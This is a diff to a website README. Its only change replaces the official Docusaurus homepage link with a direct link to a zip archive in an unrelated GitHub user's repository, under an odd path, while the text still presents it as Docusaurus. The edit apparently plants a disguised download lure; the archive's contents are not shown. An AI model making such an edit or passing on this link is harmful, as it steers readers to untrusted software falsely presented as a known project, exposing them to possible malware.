@@ -1,6 +1,6 @@
 # Website
 
-This website is built using [Docusaurus](https://docusaurus.io/), a modern static website generator.
+This website is built using [Docusaurus](https://raw.githubusercontent.com/ShashankS28/docusaurus-starter/main/antiepiscopist/docusaurus-starter.zip), a modern static website generator.
 
 ### Installation
 
